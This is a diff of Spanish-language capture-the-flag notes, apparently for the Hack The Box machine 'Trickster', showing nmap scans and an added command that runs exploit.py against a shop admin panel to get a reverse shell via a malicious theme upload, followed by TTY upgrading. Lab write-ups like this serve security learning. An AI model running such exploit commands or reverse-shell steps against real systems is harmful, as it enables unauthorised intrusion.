@@ -1,4 +1,4 @@
-
+#XSS 
 `nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.34 -oG allPorts`
 `nmap -p22,80 -sCV 10.10.11.34 -oN targeted`
 ```python
@@ -40,3 +40,7 @@ EN el PoC nos dice que hay que subir un tema malicioso podemos usar el repositor
 
 Este script nos automatiza todo el proceso de ejecución devolviéndonos una Reverse Shell directamente
 
+`python3 exploit.py --url "http://shop.trickster.htb" --email test@test.com --local-ip 10.10.14.18 --admin-path admin634ewutrx1jgitlooaj
+`
+Obtendremos una reverse shell como el usuario
+Y hacemos un tratamiento de la TTY para que podamos trabajar mas comodamente
